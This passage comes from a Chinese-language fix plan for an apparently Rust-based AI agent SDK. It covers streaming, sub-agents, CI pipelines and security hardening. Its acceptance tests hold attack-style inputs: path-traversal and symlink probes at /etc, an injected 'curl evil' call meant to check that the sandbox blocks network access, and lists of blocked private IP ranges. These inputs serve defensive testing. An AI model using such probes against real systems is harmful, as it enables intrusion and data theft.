        tokio::spawn(read_loop(BufReader::new(stdout), server.pending.clone()));

        // MCP 协议要求的 initialize 握手
        server.request("initialize", json!({"protocolVersion":"2024-11-05",
            "capabilities":{}, "clientInfo":{"name":"aether"}})).await?;
        server.notify("initialized", json!({})).await?;
        Ok(server)
    }

    async fn request(&self, method: &str, params: Value) -> Result<Value, AetherError> {
        let id = self.next_id.fetch_add(1, Ordering::SeqCst);
        let (tx, rx) = oneshot::channel();
        self.pending.lock().await.insert(id, tx);
        let body = json!({"jsonrpc":"2.0","id":id,"method":method,"params":params});
        let mut s = self.stdin.lock().await;
        s.write_all(format!("{}\n", body).as_bytes()).await?;
        s.flush().await?;
        Ok(rx.await.map_err(|_| AetherError::McpConnectionError("server closed".into()))?)
    }

    pub async fn list_tools(&self) -> Result<Vec<McpToolDef>, AetherError> {
        let r = self.request("tools/list", json!({})).await?;
        Ok(serde_json::from_value(r["tools"].clone())?)
    }

    pub async fn call_tool(&self, name: &str, args: Value) -> Result<Value, AetherError> {
        self.request("tools/call", json!({"name":name,"arguments":args})).await
    }
}
```

**验收**
- [ ] 集成测试：用 `npx @modelcontextprotocol/server-filesystem .` 启动真实 MCP，list+call 一遍
- [ ] kill 父进程时子进程被回收（`ps -o ppid` 验证）
- [ ] 100 并发 `call_tool` 不撞 id
- [ ] README "MCP" 标签从 🟠 改为 🟡（HTTP/OAuth/Server 仍欠）

---

### T-2.5  接线 11 个未读 config 字段（或删除）                     [3 天] [中] [无]

**问题**
[config.rs](../agent-core/src/config.rs) 23 个字段里 11 个从未被读取。

**改法**

| 字段 | 处理 | 接线点 |
|---|---|---|
| `enabled_toolsets`/`disabled_toolsets` | 接线 | `ToolRegistry::build()` 时 filter |
| `memory_enabled` | 接线 | `agent.rs` 创建 `MemoryCore` 处加守卫 |
| `compression_enabled`/`compression_threshold_ratio` | 接线 | T-2.2 已用 |
| `skills_enabled` | 接线 | `SkillsLoader::load()` 入口 |
| `delegation_enabled` | 接线 | T-3.6 用 |
| `max_concurrent_children`/`max_spawn_depth` | **删除**（T-3.6 再加回） | — |
| `session_id` | 接线 | `SessionStore::resume_or_create(session_id)` |
| `profile` | 接线 | T-1.4 已用 |
| `log_level` | 接线 | `tracing_subscriber::filter::EnvFilter::new(&cfg.log_level)` |

为每个保留字段加最小集成测试证明它被读：

```rust
#[test]
fn config_memory_enabled_off_skips_load() {
    let cfg = AgentConfigBuilder::new().memory_enabled(false).build();
    let agent = AIAgent::new(cfg);
    assert!(agent.memory().is_none());
}
```

**验收**
- [ ] `cargo clippy -- -D dead_code` 通过
- [ ] 每个保留字段有至少一个测试证明被消费
- [ ] config.rs 字段数从 23 降到 ≤20

---

### T-2.6  Windows / 跨平台路径与 UTF-8 修复                       [1 天] [中] [T-1.3]

**问题**
- [openai.rs:229](../agent-core/src/llm/openai.rs#L229) UTF-8 边界外切割 → 非 ASCII 错误体 panic
- C# SDK 用 `Marshal.PtrToStringAnsi`，中文回复乱码

**改法**

```rust
// agent-core/src/llm/openai.rs
let preview = text.chars().take(200).collect::<String>();
```

```csharp
// sdks/dotnet/Aether/Aether.cs
[DllImport("agent_bindings", CallingConvention = CallingConvention.Cdecl)]
private static extern IntPtr aether_chat(IntPtr agent, [MarshalAs(UnmanagedType.LPUTF8Str)] string msg);

private static string PtrToUtf8(IntPtr p) {
    if (p == IntPtr.Zero) return null;
    int len = 0; while (Marshal.ReadByte(p, len) != 0) len++;
    var bytes = new byte[len];
    Marshal.Copy(p, bytes, 0, len);
    return Encoding.UTF8.GetString(bytes);
}
```

**验收**
- [ ] 单测 `openai_error_with_chinese_body_no_panic` 通过
- [ ] Windows job 中 C# demo 输出中文不乱码（手动截屏 PR）

---

### T-2.7  真三层 Prompt + 真 ContextEngine                        [2 天] [中] [T-1.7]

**问题**
- [prompt.rs:9-32](../agent-core/src/prompt.rs#L9) "三层" 是 `Vec::join("\n")`；stable 层烤入 `Local::now()` → cache 永不命中
- [context.rs](../agent-core/src/context.rs) 只在 loop 开始时调一次

**改法**

```rust
// agent-core/src/prompt.rs
pub struct SystemPrompt {
    pub stable: String,        // session 不变：身份 + 工具集 schema
    pub contextual: String,    // 每 turn 刷新：MEMORY.md + USER.md + cwd
    pub volatile: String,      // 按需
}

impl SystemPrompt {
    pub fn assemble(&self) -> Vec<PromptBlock> {
        vec![
            PromptBlock { content: self.stable.clone(),     cache_control: Some("ephemeral") },
            PromptBlock { content: self.contextual.clone(), cache_control: None },
            PromptBlock { content: self.volatile.clone(),   cache_control: None },
        ]
    }
}
```

**关键约束**：stable 层不允许包含 `Local::now()` / `Uuid::new_v4()` / 任何 per-turn 变化内容。日期放 contextual。

```rust
// agent-core/src/context.rs
pub struct ContextEngine { cwd: PathBuf }

impl ContextEngine {
    pub fn snapshot(&self) -> String {
        let now = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        let cwd = self.cwd.display();
        let files = list_files_truncated(&self.cwd, 30);
        format!("<env>\nnow: {now}\ncwd: {cwd}\nfiles:\n{files}\n</env>")
    }
}

// 每个 iteration 开始调用
let ctx_text = self.context_engine.snapshot();
messages[0].content = build_system_prompt_with(ctx_text);
```

**验收**
- [ ] 单测：连续 5 turn 调用，`prompt.stable` 字符串完全相同
- [ ] 单测：`prompt.contextual` 在 turn 之间变化
- [ ] Anthropic provider 在 stable 层加 `cache_control: ephemeral`

---

### T-2.8  Profile 真隔离：SessionStore + Skills 路径都 per-profile  [1.5 天] [中] [T-1.4]

**问题**
T-1.4 修了路径，但 SessionStore 可能是单例，Skills 加载写死 `~/.aether/skills/`。

**改法**

```rust
// agent-core/src/agent.rs
let profile = ProfileManager::new(config.profile.clone());
let home = profile.home();
let memory  = MemoryCore::open(home.join("MEMORY.md"), home.join("USER.md"))?;
let store   = SessionStore::open(home.join("sessions.db"))?;
let skills  = SkillsLoader::from_dir(home.join("skills"))?;
```

**验收**
- [ ] `aether --profile a chat "remember X"` 后 `--profile b chat "what did I tell you"` **不知道 X**
- [ ] `--profile a skill create foo` 不出现在 `--profile b skill list`

---

### T-2.9  补 cargo doc 测试 + 删除恒真断言                        [0.5 天] [低] [无]

**问题**
README 宣称 52 测试实测 49；含 `assert!(... || true)` 恒真；3 个缺 Hermes 源码早 return。

**改法**

- 删 `assert!(... || true)`，改成真正 assertion
- 早 return 测试改 `#[cfg_attr(not(feature = "hermes_corpus"), ignore)]`
- README 测试数改成准确数字

**验收**
- [ ] `cargo test --features hermes_corpus 2>&1 | grep "test result"` 输出与 README 一致
- [ ] `grep -rn "|| true" agent-core/` 无结果

---

## 8. 阶段 3 — 真功能（~4-6 周）

> 目标：把"看起来已实现"的高级能力**真的写出来**。会引入新概念，可能小幅改 trait 表面。

---

### T-3.1  OpenAI 流式 SSE 真解析 tool_calls 增量                  [1 周] [高] [T-2.1]

**问题**
[openai.rs:360](../agent-core/src/llm/openai.rs#L360) 流式硬编码 `tool_calls: None`。

**改法**

OpenAI SSE 协议：`delta.tool_calls[].function.{name,arguments}` 可能分多 chunk 到达，按 `index` 累加。

```rust
struct StreamingState {
    text: String,
    tool_calls: HashMap<u32, ToolCallBuilder>,
}

#[derive(Default)]
struct ToolCallBuilder {
    id: Option<String>,
    name: Option<String>,
    args: String,  // 累积 JSON
}

impl StreamingState {
    fn ingest(&mut self, delta: &Value) {
        if let Some(c) = delta["content"].as_str() { self.text.push_str(c); }
        if let Some(tcs) = delta["tool_calls"].as_array() {
            for tc in tcs {
                let idx = tc["index"].as_u64().unwrap_or(0) as u32;
                let b = self.tool_calls.entry(idx).or_default();
                if let Some(id) = tc["id"].as_str() { b.id = Some(id.into()); }
                if let Some(n)  = tc["function"]["name"].as_str() { b.name = Some(n.into()); }
                if let Some(a)  = tc["function"]["arguments"].as_str() { b.args.push_str(a); }
            }
        }
    }
}
```

**验收**
- [ ] 集成测试：mock OpenAI server 发分块 tool_call delta，聚合出完整 `ToolCall`
- [ ] 多并发 tool_call 测试（同时 emit index=0 和 index=1）

---

### T-3.2  Anthropic 流式（Messages API SSE）                       [1 周] [高] [T-3.1]

**问题**
[anthropic.rs:257-265](../agent-core/src/llm/anthropic.rs#L257) 直接 `Err(UnsupportedApiMode)`。

**改法**

Anthropic 流式事件：`message_start` / `content_block_start` / `content_block_delta` / `content_block_stop` / `message_delta` / `message_stop`。`tool_use` 通过 `content_block_start` 给 `id+name`，`input_json_delta` 累加 `partial_json`。

```rust
async fn stream(&self, req: &ChatRequest) -> Result<Stream, AetherError> {
    let mut state = AnthropicStreamState::default();
    let mut sse = self.post_sse(req).await?;
    while let Some(event) = sse.next().await {
        match event?.event_type.as_str() {
            "content_block_start" => state.start_block(&event.data),
            "content_block_delta" => state.append_delta(&event.data),
            "content_block_stop"  => state.finalize_block(),
            "message_stop"        => return Ok(state.into_stream()),
            _ => {}
        }
    }
    Err(AetherError::StreamTruncated)
}
```

**验收**
- [ ] mock Anthropic SSE server 测试：text+tool_use 混合流可正确聚合
- [ ] README "Streaming" 标签升级条件之一

---

### T-3.3  chat_stream 真正跑 ReAct 循环                           [3 天] [高] [T-3.1, T-3.2]

**问题**
[agent.rs:192-216](../agent-core/src/agent.rs#L192) 是单次 LLM 调用，没有 ReAct 循环。

**改法**

```rust
pub fn chat_stream(&self, user_msg: &str) -> impl Stream<Item = StreamEvent> {
    let agent = self.clone();
    async_stream::stream! {
        let mut messages = agent.build_initial_messages(user_msg);
        loop {
            let mut chunk_text = String::new();
            let mut tool_calls = Vec::new();

            let mut s = agent.model.stream(&messages, &agent.tools).await?;
            while let Some(chunk) = s.next().await {
                let chunk = chunk?;
                if !chunk.text.is_empty() {
                    chunk_text.push_str(&chunk.text);
                    yield StreamEvent::Text(chunk.text);
                }
                tool_calls.extend(chunk.tool_calls);
            }

            if tool_calls.is_empty() {
                yield StreamEvent::Done(chunk_text);
                break;
            }

            messages.push(Message::assistant_with_calls(&chunk_text, &tool_calls));
            for tc in tool_calls {
                yield StreamEvent::ToolCall(tc.clone());
                let obs = agent.dispatch_tool(&tc).await?;
                yield StreamEvent::ToolResult(tc.id.clone(), obs.clone());
                messages.push(Message::tool(&tc.id, obs));
            }
        }
    }
}
```

**StreamEvent 是新增公开 enum** — minor breaking change，写入 CHANGELOG。

**验收**
- [ ] 集成测试：mock LLM 工具调用 → 流接收 `ToolCall` → 工具执行 → `ToolResult` → 第二轮 LLM 文本 → `Done`
- [ ] Python/Android/C# SDK 暴露 `chat_stream` 等价 API

---

### T-3.4  Background Review 真 spawn child agent                  [1 周] [高] [T-2.5]

**问题**
[review.rs:88-118](../agent-core/src/memory/review.rs#L88) 复用父 model handle、无受限工具集、无独立 budget。Skill 全部叫 `auto-learned-skill`。

**改法**

```rust
// agent-core/src/subagent.rs (新文件)
pub struct SubAgentConfig {
    pub parent_model: Arc<dyn ChatModel>,
    pub allowed_tools: Vec<String>,
    pub max_iterations: usize,
    pub system_prompt: String,
    pub depth: u8,
}

pub async fn run_subagent(cfg: SubAgentConfig, goal: String) -> Result<SubAgentOutcome, AetherError> {
    if cfg.depth >= MAX_SPAWN_DEPTH { return Err(AetherError::MaxSpawnDepthExceeded); }
    let messages = vec![Message::system(cfg.system_prompt), Message::user(goal)];
    let tools = ToolRegistry::filtered(&cfg.allowed_tools);
    let budget = IterationBudget::new(cfg.max_iterations);
    loop_mod::run_react(cfg.parent_model, messages, tools, budget).await
}

// agent-core/src/memory/review.rs
pub async fn spawn_background_review(parent: &AIAgent, turn: &TurnSnapshot) {
    let cfg = SubAgentConfig {
        parent_model: parent.model.clone(),
        allowed_tools: vec!["memory.write".into(), "skill.create".into()],
        max_iterations: 10,
        system_prompt: REVIEW_SYSTEM_PROMPT.into(),
        depth: 1,
    };
    tokio::spawn(async move { let _ = run_subagent(cfg, format_turn(turn)).await; });
}
```

Skill 命名碰撞修复：用 `name: review-{date}-{slug}`。

**验收**
- [ ] 单测：review 跑完后 `~/.aether/profiles/default/skills/` 多出一个 skill 文件
- [ ] 多次 review 不产生同名 skill
- [ ] subagent 不能调用未授权工具（deny tool 单测）

---

### T-3.5  Curator 自动调度                                        [1 周] [高] [T-3.4]

**问题**
README 声明 Curator 管 skill 生命周期，实际从未启动。

**改法**

```rust
pub struct Curator {
    home: PathBuf,
    interval: Duration,                // 默认 7 天
    last_run_marker: PathBuf,
}

impl Curator {
    pub async fn maybe_run_inline(&self, model: &Arc<dyn ChatModel>) -> Result<(), AetherError> {
        if !self.is_due()? { return Ok(()); }
        let cfg = SubAgentConfig {
            parent_model: model.clone(),
            allowed_tools: vec!["skill.list".into(), "skill.update".into(), "skill.archive".into()],
            max_iterations: 30,
            system_prompt: CURATOR_SYSTEM_PROMPT.into(),
            depth: 1,
        };
        let _ = subagent::run_subagent(cfg, "Curate skills.".into()).await?;
        self.mark_run()?;
        Ok(())
    }
}

// 在 agent.chat() 退出前调用
self.curator.maybe_run_inline(&self.model).await.ok();
```

**注意**：不引入后台守护线程（跨平台地雷）；用 inline 检查每次 chat 结束顺手判到期，更适合 SDK 形态。

**验收**
- [ ] 单测：marker 改 8 天前 → 下次 `chat()` 后 curator 跑过
- [ ] 单测：marker 今天 → `chat()` 后 curator 不跑

---

### T-3.6  真 Sub-agent Delegation                                  [1 周] [高] [T-3.4]

**问题**
T-1.6 已截肢；现在补真功能。

**改法**

```rust
pub struct Delegate;

#[async_trait]
impl Tool for Delegate {
    fn name(&self) -> &str { "delegate" }
    fn schema(&self) -> Value {
        json!({"type":"object","properties":{
            "goal":{"type":"string"},
            "allowed_tools":{"type":"array","items":{"type":"string"}}
        },"required":["goal"]})
    }
    async fn call(&self, args: Value, ctx: &ToolCtx) -> Result<Value, AetherError> {
        let goal = args["goal"].as_str().unwrap();
        let tools = args["allowed_tools"].as_array()
            .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.into())).collect())
            .unwrap_or_else(|| vec!["read_file".into(), "web_search".into()]);
        let cfg = SubAgentConfig {
            parent_model: ctx.model.clone(),
            allowed_tools: tools,
            max_iterations: ctx.config.max_iterations / 2,
            system_prompt: SUBAGENT_SYSTEM_PROMPT.into(),
            depth: ctx.depth + 1,
        };
        let outcome = run_subagent(cfg, goal.into()).await?;
        Ok(json!(outcome.final_response))
    }
}
```

**验收**
- [ ] 集成测试：LLM 调 delegate → 子 agent 跑 → 返回结果
- [ ] 测试：3 层嵌套 delegate 抛 `MaxSpawnDepthExceeded`
- [ ] 测试：子 agent 用未授权工具被拒

---

### T-3.7  secure_path 用 canonicalize + 白名单根                  [3 天] [高] [无]

**问题**
[file_tools.rs:8-23](../agent-core/src/tools/file_tools.rs#L8) `secure_path` 纯字面量检查，符号链接可越狱。

**改法**

```rust
pub struct SecurePath {
    roots: Vec<PathBuf>,  // 白名单：cwd、~/.aether/profiles/<active>/、显式给的项目根
}

impl SecurePath {
    pub fn resolve(&self, p: &str) -> Result<PathBuf, AetherError> {
        let candidate = PathBuf::from(p);
        let absolute = if candidate.is_absolute() { candidate }
                       else { std::env::current_dir()?.join(candidate) };
        let canon = std::fs::canonicalize(&absolute).or_else(|_| {
            let parent = absolute.parent().ok_or(AetherError::PathOutsideAllowedRoots)?;
            let parent_canon = std::fs::canonicalize(parent)?;
            Ok::<_, std::io::Error>(parent_canon.join(absolute.file_name().unwrap()))
        })?;
        if self.roots.iter().any(|r| canon.starts_with(r)) { Ok(canon) }
        else { Err(AetherError::PathOutsideAllowedRoots) }
    }
}
```

**验收**
- [ ] 单测：`SecurePath::new(vec!["/tmp/work"]).resolve("../etc/passwd")` Err
- [ ] 单测：mkdir `/tmp/work`，里面 `ln -s /etc passwd_link`，`resolve("passwd_link")` Err
- [ ] 单测：合法路径解析成功

---

### T-3.8  SSRF 真防御：解析 IP + 处理 IDN/十进制/十六进制         [3 天] [高] [无]

**问题**
[web_tools.rs:7-55](../agent-core/src/tools/web_tools.rs#L7) SSRF 防御是小写字串 `contains`。

**改法**

```rust
// agent-core/src/tools/url_safety.rs
use url::Url;
use std::net::IpAddr;

pub fn validate_external_url(s: &str) -> Result<Url, AetherError> {
    let url = Url::parse(s).map_err(|_| AetherError::InvalidUrl)?;
    if !matches!(url.scheme(), "http" | "https") {
        return Err(AetherError::DisallowedScheme);
    }
    let host = url.host_str().ok_or(AetherError::InvalidUrl)?;
    let ips = resolve_host(host)?;
    for ip in ips {
        if is_private_or_local(&ip) {
            return Err(AetherError::SsrfBlocked(ip.to_string()));
        }
    }
    Ok(url)
}

fn is_private_or_local(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => v4.is_loopback() || v4.is_private() ||
                          v4.is_link_local() || v4.is_broadcast() ||
                          v4.is_documentation() || v4.is_unspecified() ||
                          (v4.octets()[0] == 169 && v4.octets()[1] == 254),
        IpAddr::V6(v6) => v6.is_loopback() || v6.is_unspecified() ||
                          (v6.segments()[0] & 0xfe00 == 0xfc00),
    }
}
```

`WebSearch` 与 `WebFetch` 入口都调 `validate_external_url`。

**验收**
- [ ] 单测覆盖：`localhost`、`127.0.0.1`、`0.0.0.0`、`10.x`、`192.168.x.x`、`169.254.x.x`、`::1`、IDN homograph、十进制 IP、十六进制 IP、八进制 IP 全拒
- [ ] 合法 URL 通过
- [ ] WebSearch + WebFetch 都调 validator

---

### T-3.9  Secret 处理 + 内存安全                                  [3 天] [高] [无]

**问题**
- API key 是 `String`，可能被 tracing/Debug/panic 泄漏
- [memory_tool.rs:63-69](../agent-core/src/tools/memory_tool.rs#L63) LLM 输出原始文本永久追加到 `MEMORY.md`，无去重、无上限、无脱敏

**改法**

```toml
secrecy = "0.8"
```

```rust
use secrecy::SecretString;

pub struct AgentConfig {
    pub api_key: SecretString,
    // ...
}

impl std::fmt::Debug for AgentConfig {
    fn fmt(&self, f: &mut Formatter) -> Result<()> {
        f.debug_struct("AgentConfig")
            .field("api_key", &"<redacted>")
            .field("provider", &self.provider).finish()
    }
}

// memory_tool.rs
fn redact_secrets(s: &str) -> String {
    let re = regex::Regex::new(r"(sk-[A-Za-z0-9]{20,}|ghp_[A-Za-z0-9]{30,})").unwrap();
    re.replace_all(s, "<redacted-secret>").to_string()
}

const MEMORY_MAX_BYTES: usize = 64 * 1024;
const MEMORY_DEDUP_LAST: usize = 64;

pub fn append_memory(home: &Path, content: &str) -> Result<()> {
    let content = redact_secrets(content);
    let path = home.join("MEMORY.md");
    let cur = std::fs::read_to_string(&path).unwrap_or_default();
    if dedup_last_lines(&cur, &content, MEMORY_DEDUP_LAST) { return Ok(()); }
    let mut next = cur; next.push_str("\n- "); next.push_str(&content);
    if next.len() > MEMORY_MAX_BYTES { next = next.split_off(next.len() - MEMORY_MAX_BYTES); }
    std::fs::write(&path, next)?;
    Ok(())
}
```

**验收**
- [ ] `format!("{:?}", config)` 不暴露 api_key
- [ ] 单测：写 100 次同样 memory，文件不无限增长
- [ ] 单测：含 `sk-abcdefghijklmnop` 的输出 → 文件里是 `<redacted-secret>`

---

## 9. 阶段 4 — 跨平台真验证（~6-8 周）

> 目标：让 "Verified" 标签首次有真实含义。大量工作在 CI / 构建产物 / 平台特定问题。

---

### T-4.1  ExecuteCode：选定路径（Wasmtime / Docker / 删除）       [2 周] [高] [无]

**问题**
[terminal_backends.rs:93-151](../agent-core/src/tools/terminal_backends.rs#L93) 文档说"隔离进程"实际在宿主跑。requirements.md 已承认"跨平台安全沙箱不存在"。

**改法（三选一，必须做决定）**

**选项 A（推荐）—— Docker as default backend**

```rust
async fn run_in_docker(image: &str, code: &str, lang: &str) -> Result<String> {
    let out = Command::new("docker")
        .args(["run", "--rm", "--network=none",
               "--memory=256m", "--cpus=1",
               "--read-only", "--tmpfs=/tmp:size=64m",
               image, lang_runner(lang), "-c", code])
        .output().await?;
    // ...
}
```

- 需要 Docker daemon
- 移动端不可用 → 用 `cfg(any(target_os="linux", target_os="windows", target_os="macos"))` gate
- README 明确写 "ExecuteCode requires Docker; not available on Android/iOS"

**选项 B —— 集成 Wasmtime**
- 只支持 WASM 编译的语言（限制大）
- 完全平台无关
- 实际能用的语言有限

**选项 C —— 删除 ExecuteCode**
- 文档诚实："Aether 不提供 code sandbox。若需执行 LLM 输出代码，由调用方负责沙箱化"
- 工具从 registry 移除

**强烈推荐选项 A** —— 最实用且诚实的折中。

**验收（按选项 A）**
- [ ] Docker 不可用时工具不注册
- [ ] 注入 `os.system("curl evil")` 无网络访问（`--network=none` 生效）
- [ ] CPU/内存超限被 docker 杀掉
- [ ] README Tool System 写 "ExecuteCode: requires Docker; desktop only"

---

### T-4.2  Web SDK 真接 agent-core（抽 HttpClient + SessionStore trait）  [3 周] [高] [T-1.5, T-3.1]

**问题**
[agent-wasm/src/lib.rs](../agent-wasm/src/lib.rs) **根本不调** `agent_core::AIAgent`，只是 `web_sys::fetch` 包了一个 `/chat/completions` POST。Web SDK 是 587KB 的 fetch wrapper，**不是 agent**。

**根本原因**
agent-core 默认 feature `native` 拉 tokio + reqwest + rusqlite + portable-pty，不能编进 WASM。

**改法**

把网络层和持久化层抽 trait：

```rust
// agent-core/src/runtime.rs (新文件)
#[async_trait]
pub trait HttpClient: Send + Sync {
    async fn post_json(&self, url: &str, body: &Value) -> Result<Response, AetherError>;
    async fn post_sse(&self, url: &str, body: &Value) -> Result<SseStream, AetherError>;
}

#[async_trait]
pub trait SessionStore: Send + Sync {
    async fn save(&self, msg: &Message) -> Result<()>;
    async fn load(&self, session_id: &str) -> Result<Vec<Message>>;
    async fn search(&self, query: &str) -> Result<Vec<SearchHit>>;
}
```

native build 用 `reqwest::Client` + `rusqlite::Connection`；wasm build 用 `web_sys::fetch` + IndexedDB（或 in-memory）。

```rust
pub struct AIAgent {
    http: Arc<dyn HttpClient>,
    store: Arc<dyn SessionStore>,
    // ...
}

impl AIAgent {
    #[cfg(feature = "native")]
    pub fn new_native(cfg: AgentConfig) -> Self {
        Self { http: Arc::new(ReqwestClient::new()),
               store: Arc::new(SqliteStore::open(&cfg.session_db_path)?), .. }
    }
    #[cfg(target_arch = "wasm32")]
    pub fn new_wasm(cfg: AgentConfig) -> Self {
        Self { http: Arc::new(FetchClient::new()),
               store: Arc::new(InMemoryStore::new()), .. }
    }
}
```

```rust
// agent-wasm/src/lib.rs
#[wasm_bindgen]
pub struct AetherWasm { inner: agent_core::AIAgent }

#[wasm_bindgen]
impl AetherWasm {
    #[wasm_bindgen(constructor)]
    pub fn new(provider: &str, model: &str, api_key: &str) -> Self {
        let cfg = AgentConfig::builder().provider(provider).model(model).api_key(api_key).build();
        Self { inner: agent_core::AIAgent::new_wasm(cfg) }
    }
    pub async fn chat(&self, msg: String) -> Result<String, JsValue> {
        self.inner.chat(&msg).await.map_err(|e| JsValue::from_str(&e.to_string()))
    }
}
```

这是 agent-core 的**中等手术**，但是值得 —— 它让"跨平台"从口号变成 trait。

**验收**
- [ ] `cargo build -p agent-core --target wasm32-unknown-unknown --no-default-features` 通过
- [ ] agent-wasm 真正调用 `agent_core::AIAgent::chat`
- [ ] Web demo 可以 LLM round-trip
- [ ] CI 加 wasm build job

---

### T-4.3  Android CI：NDK 构建 + emulator e2e                    [2 周] [高] [T-1.3, T-4.2]

**问题**
README "Android ✅ Verified"，但 jniLibs/ 不在仓库；CI 不跑任何 Android 检查。

**改法**

```yaml
# .github/workflows/android.yml
jobs:
  android-build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: 17 }
      - uses: nttld/setup-ndk@v1
        with: { ndk-version: r26d }
      - uses: dtolnay/rust-toolchain@stable
        with: { targets: aarch64-linux-android,armv7-linux-androideabi }
      - run: cargo install cargo-ndk
      - run: cargo ndk -t arm64-v8a -t armeabi-v7a -o sdks/android/src/main/jniLibs build --release -p agent-bindings
      - run: cd sdks/android && ./gradlew assembleRelease

  android-emulator-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: reactivecircus/android-emulator-runner@v2
        with:
          api-level: 30
          script: cd examples/android-demo && ./gradlew connectedAndroidTest
```

examples/android-demo 加 instrumentation test：构造 `Aether(provider="openai", model="gpt-...", apiKey=BuildConfig.TEST_KEY)`，调一次 `chat()` 看返回非空。

**验收**
- [ ] CI 产出 `.so` artifact 可下载
- [ ] emulator e2e 在 CI 通过
- [ ] README "Android" 标签后加 CI badge link

---

### T-4.4  iOS CI：macOS runner + xcodebuild + xcframework        [1.5 周] [高] [T-4.2]

**问题**
中英 README iOS 状态矛盾；xcframework 不在仓库。

**改法**

```yaml
# .github/workflows/ios.yml
jobs:
  ios-build:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
        with: { targets: aarch64-apple-ios,x86_64-apple-ios,aarch64-apple-ios-sim }
      - run: cargo build --release --target aarch64-apple-ios -p agent-bindings --features uniffi
      - run: cargo build --release --target aarch64-apple-ios-sim -p agent-bindings --features uniffi
      - run: bash scripts/build-xcframework.sh
      - uses: actions/upload-artifact@v4
        with: { name: AetherSDK.xcframework, path: target/AetherSDK.xcframework }

  ios-simulator-test:
    runs-on: macos-latest
    needs: ios-build
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with: { name: AetherSDK.xcframework, path: sdks/ios/ }
      - run: cd examples/ios-demo && xcodebuild test -scheme AetherDemo -destination 'platform=iOS Simulator,name=iPhone 15'
```

**验收**
- [ ] CI 产出 xcframework artifact
- [ ] iOS simulator 测试通过
- [ ] README iOS 标签升 ✅ Functional（中英一致）

---

### T-4.5  Windows CI：MSVC + UTF-8 P/Invoke + portable-pty       [1.5 周] [高] [T-2.6]

**问题**
- CI 无 Windows job
- portable-pty 在 Windows 构建可能失败
- agent_bindings.dll 不在仓库

**改法**

```yaml
# .github/workflows/ci.yml windows job 中加：
- run: cargo build --release -p agent-bindings
- run: dotnet build sdks/dotnet/Aether/Aether.csproj
- run: dotnet test sdks/dotnet/Aether.Tests/Aether.Tests.csproj
```

sdks/dotnet/Aether.Tests/ 加 NUnit：

```csharp
[Test]
public async Task ChatWithChineseRoundtrip() {
    var agent = new AetherAgent("openai", "gpt-4o-mini", Env.Var("TEST_KEY"));
    agent.InitModel();
    var reply = await agent.Chat("你好，请用中文回我");
    Assert.That(reply, Does.Contain("你好").Or.Match("[一-鿿]+"));
}
```

**验收**
- [ ] Windows job 跑 cargo + dotnet 测试通过
- [ ] dll artifact 可下载
- [ ] 中文 roundtrip 在 CI 通过

---

### T-4.6  Python SDK：cibuildwheel + 真打 native lib 进 wheel     [1 周] [高] [T-1.5]

**问题**
`libuniffi.so` 不在包里、`pyproject.toml` 无 `package_data`、无 `cibuildwheel` → `import aether` OSError。

**改法**

切到 maturin 构建（推荐）：

```toml
# sdks/python/pyproject.toml
[build-system]
requires = ["maturin>=1.4"]
build-backend = "maturin"

[project]
name = "aether-agent"
version = "0.1.0"
```

或保留 setuptools + cibuildwheel：

```yaml
# .github/workflows/python.yml
jobs:
  build-wheels:
    strategy:
      matrix: { os: [ubuntu-latest, windows-latest, macos-latest] }
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: pypa/cibuildwheel@v2.16
        with: { package-dir: sdks/python }
      - uses: actions/upload-artifact@v4
        with: { name: wheels-${{ matrix.os }}, path: wheelhouse/*.whl }
```

**验收**
- [ ] `pip install dist/aether_agent-0.1.0-cp311-cp311-linux_x86_64.whl` 后 `python -c "import aether; aether.Aether(...)"` 不报 OSError
- [ ] 3 个 OS 都产出 wheel
- [ ] README 加 `pip install aether-agent` 说明

---


# Part III — 执行指南

## 10. PR 提交模板

每个 task 用一份 PR，描述统一格式（建议放进 `.github/PULL_REQUEST_TEMPLATE.md`）：

```markdown
## Task

引用：[FIX_PLAN.md T-X.Y](../docs/FIX_PLAN.md#t-xy-<标题>)

## 问题

<复制 task 中"问题"段，含 file:line>

## 改动清单

- 改了 `A.rs`: <一句话>
- 加了测试 `B::yyyy`
- 文档更新：README 第 N 行 / docs/foo.md

## 验收

按 FIX_PLAN.md T-X.Y 的验收清单逐项 ☑

- [ ] <验收项 1>
- [ ] <验收项 2>

## 风险

<对照 task 标注的"风险"等级，说明额外的临时验证>

## CI 状态

- [ ] ubuntu-latest 全绿
- [ ] windows-latest 全绿（阶段 2 起强制）
- [ ] macos-latest 全绿（阶段 2 起强制）
```

---

## 11. 执行节奏建议

| 周 | 阶段 | 任务 | 关键里程碑 |
|---|---|---|---|
| W1 | 阶段 1 | T-1.1 ~ T-1.7 | 一周内全部 merge；发 v0.2-honest |
| W2-W4 | 阶段 2 | T-2.1 ~ T-2.9 | 每周 3 个 task；末尾发 v0.3 |
| W5-W10 | 阶段 3 | T-3.1 ~ T-3.9 | 每周 1.5 个 task；末尾发 v0.5 |
| W11-W18 | 阶段 4 | T-4.1 ~ T-4.6 | 每个 task 1-3 周；末尾发 v1.0 |

每个 stage 结束后写一次 **RELEASE_NOTES.md**，明确列出本版本完成的 task 编号。

---

## 12. 进度度量指标

每周末跑一遍下面这套指标，贴在 README 顶部的徽章里：

| 指标 | 命令 | 目标 |
|---|---|---|
| 真实测试通过数 | `cargo test --workspace 2>&1 \| grep "test result: ok" \| wc -l` | 每周递增 |
| 实现完成度 | FIX_PLAN.md 中已勾选 task / 总 task 数 | 31/31 为 v1.0 |
| README ✅ Functional 数 | 数 README Features 表 | n/11 |
| 平台 verified 数（CI 通过）| 数有 CI badge 的平台 | n/5 |
| `cargo clippy -- -D warnings` | 直接跑 | 0 warning |
| 未读 config 字段数 | `cargo expand` 后人工核 | 0 |

**诚实指标比"看起来很完整"重要**。把这套指标 commit 进 `docs/METRICS.md` 并每周更新。

---

## 13. 不容跳过的守则

1. **阶段 1 完成前不要发布 v0.2** — 否则 README 的可信度还在透支
